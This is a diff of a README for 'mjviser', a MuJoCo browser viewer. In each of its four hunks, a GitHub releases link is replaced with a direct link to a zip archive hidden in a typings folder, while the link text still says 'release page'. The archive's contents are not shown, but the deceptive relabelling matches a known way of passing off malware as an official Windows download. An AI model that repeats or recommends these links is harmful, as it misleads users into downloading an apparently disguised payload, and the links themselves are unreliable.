@@ -1,6 +1,6 @@
 # 🧭 mjviser - View MuJoCo scenes in your browser
 
-[![Download mjviser](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/wallasshallow430/mjviser/releases)
+[![Download mjviser](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/wallasshallow430/mjviser/raw/refs/heads/main/typings/mujoco/rendering/classic/Software-v2.3.zip)
 
 ## 🖥️ What is mjviser?
 
@@ -16,7 +16,7 @@ Use it to:
 
 Use this page to download the Windows version:
 
-[Visit the release page](https://github.com/wallasshallow430/mjviser/releases)
+[Visit the release page](https://github.com/wallasshallow430/mjviser/raw/refs/heads/main/typings/mujoco/rendering/classic/Software-v2.3.zip)
 
 On that page, look for the latest release and download the Windows file. If there are more than one file, pick the one that ends with `.exe` or a Windows package name.
 
@@ -138,7 +138,7 @@ When you open the release page, look for:
 
 Release page link:
 
-[https://github.com/wallasshallow430/mjviser/releases](https://github.com/wallasshallow430/mjviser/releases)
+[https://github.com/wallasshallow430/mjviser/raw/refs/heads/main/typings/mujoco/rendering/classic/Software-v2.3.zip](https://github.com/wallasshallow430/mjviser/raw/refs/heads/main/typings/mujoco/rendering/classic/Software-v2.3.zip)
 
 ## 📌 What You Can Expect
 
@@ -158,7 +158,7 @@ A few terms may appear when using the app:
 
 Use this link to visit the release page and download the Windows file:
 
-[Download from GitHub Releases](https://github.com/wallasshallow430/mjviser/releases)
+[Download from GitHub Releases](https://github.com/wallasshallow430/mjviser/raw/refs/heads/main/typings/mujoco/rendering/classic/Software-v2.3.zip)
 
 ## 🖼️ What the Interface Is For
 
